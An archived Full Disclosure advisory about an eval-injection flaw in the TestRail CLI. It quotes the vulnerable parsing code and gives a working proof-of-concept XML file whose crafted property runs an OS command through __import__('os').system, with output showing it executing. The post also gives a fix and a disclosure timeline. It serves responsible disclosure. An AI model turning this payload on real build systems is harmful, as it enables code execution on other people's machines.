---
title: Unsafe eval() in TestRail CLI
url: https://seclists.org/fulldisclosure/2024/Nov/2
source: Full Disclosure
date: 2024-11-08
fetch_date: 2025-10-06T19:29:50.095603
---

# Unsafe eval() in TestRail CLI

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](1)
[By Date](date.html#2)
[![Next](/images/right-icon-16x16.png)](3)

[![Previous](/images/left-icon-16x16.png)](1)
[By Thread](index.html#2)
[![Next](/images/right-icon-16x16.png)](3)

![](/shared/images/nst-icons.svg#search)

# Unsafe eval() in TestRail CLI

---

*From*: Devin Cook <devin.c.cook () gmail com>
*Date*: Tue, 5 Nov 2024 12:36:12 -0800

---

```
This is not a very exciting vulnerability, but I had already publicly disclosed
it on GitHub at the request of the vendor. Since that report has disappeared,
the link I had provided to MITRE was invalid, so here it is again.

-Devin

---

# Unsafe `eval()` in TestRail CLI FieldsParser

Date Reported: 2024-10-03
CVSSv3.1 Score: 7.3
CVSSv3.1 Vector: AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H
Severity: Medium
Vulnerability Class: Eval Injection

## Summary

While parsing test result XML files with the TestRail CLI, the presence of
certain TestRail-specific fields can cause untrusted data to flow into an
`eval()` statement, leading to arbitrary code execution. In order to exploit
this, an attacker would need to be able to cause the TestRail CLI to parse a
malicious XML file. Normally an attacker with this level of control would
already have other avenues of gaining code execution.

However, there could be cases where an attacker can inject a malicious test
result file but is otherwise unable to execute arbitrary code on the system
running the TestRail CLI, resulting in a Local Privilege Escalation or Remote
Code Execution issue. In the worst case, this could result in compromising a
build system.

## Description

The vulnerability stems from the `eval()` statement in the
`FieldsParser.resolve_fields()` method:

```py
def resolve_fields(fields: Union[List[str], Dict]) -> (Dict, str):
    error = None
    fields_dictionary = {}
    try:
        if isinstance(fields, list) or isinstance(fields, tuple):
            for field in fields:
                field, value = field.split(":", maxsplit=1)
                if value.startswith("["):
                    try:
                        value = eval(value)
                    except Exception:
                        pass
                fields_dictionary[field] = value
        elif isinstance(fields, dict):
            fields_dictionary = fields
        else:
            error = f"Invalid field type ({type(fields)}), supported
types are tuple/list/dictionary"
        return fields_dictionary, error
    except Exception as ex:
        return fields_dictionary, f"Error parsing fields: {ex}"
```

https://github.com/gurock/trcli/blob/066008477bd4b05e46bb723c09373e8111cb2dea/trcli/data_classes/data_parsers.py#L61

This method is called when parsing result or case fields in JUnit or Robot XML
files if there are any Properties that have names starting
with`testrail_result_field` or `testrail_case_field`. In both cases, the value
or text of that Property is passed more or less directly to `eval()`.

A specially crafted Property value can therefore be used to execute arbitrary
Python code.

### Examples

The following XML file will cause the TestRail CLI to spawn a shell and execute
our echo command:

```
<?xml version="1.0" encoding="UTF-8"?>
<testsuites time="15.682687">
    <testsuite name="Tests.Execution" time="6.666666">
        <testcase name="testCase0" classname="Tests.Registration" assertions="4"
            time="1.625275" file="tests/registration.code" line="302">
            <properties>
                <property name="testrail_case_field">
                    :[] or __import__('os').system('echo THIS IS
INSIDE THE EVAL STATEMENT')
                </property>
            </properties>
        </testcase>
    </testsuite>
</testsuites>
```

```
(trcli) devin@devin-laptop:~/code/trcli$ trcli -h http://127.0.0.1 -u
me -p no --project foo parse_junit -f ./pwn.xml --title bar
TestRail CLI v1.9.7
Copyright 2024 Gurock Software GmbH - www.gurock.com
Parser Results Execution Parameters
```

> ```
> Report file: ./pwn.xml
> Config file: None
> TestRail instance: http://127.0.0.1 (user: me)
> Project: foo
> Run title: bar
> Update run: No
> Add to milestone: No
> Auto-create entities: None
> ```

```
Parsing JUnit report.
THIS IS INSIDE THE EVAL STATEMENT
Processed 1 test cases in section Tests.Execution.
```

## Impact

An attacker able to inject a malicious JUnit or Robot test result XML file can
compromise the system running the TestRail CLI.

## References

* CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code
  ('Eval Injection')](https://cwe.mitre.org/data/definitions/95.html)

# Recommendations

Use `ast.literal_eval()` instead. While `literal_eval()` could still be abused
to cause a Denial of Service, it prevents the execution of arbitrary code.

# Timeline

2024-10-01: Issue Discovered
2024-10-02: Contacted the vendor according to the instructions on their
            [security page](https://www.testrail.com/about/security/)
2024-10-03: Report sent to vendor via ZenDesk ticket \#359983
2024-10-04: Vendor requests public disclosure in a GitHub Issue
2024-10-11: Published report as [public GitHub
            Issue](https://github.com/gurock/trcli/issues/279)
2024-10-30: Noticed that the vendor has deleted the [public GitHub
            Issue](https://github.com/gurock/trcli/issues/279) containing the
            bug report and some conversation about responsible disclosure and
            requesting a CVE. The vulnerability has not been fixed in the
            `main` branch.
2024-11-05: Full disclosure mailing list notified.
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](1)
[By Date](date.html#2)
[![Next](/images/right-icon-16x16.png)](3)

[![Previous](/images/left-icon-16x16.png)](1)
[By Thread](index.html#2)
[![Next](/images/right-icon-16x16.png)](3)

### Current thread:

* **Unsafe eval() in TestRail CLI** *Devin Cook (Nov 06)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/...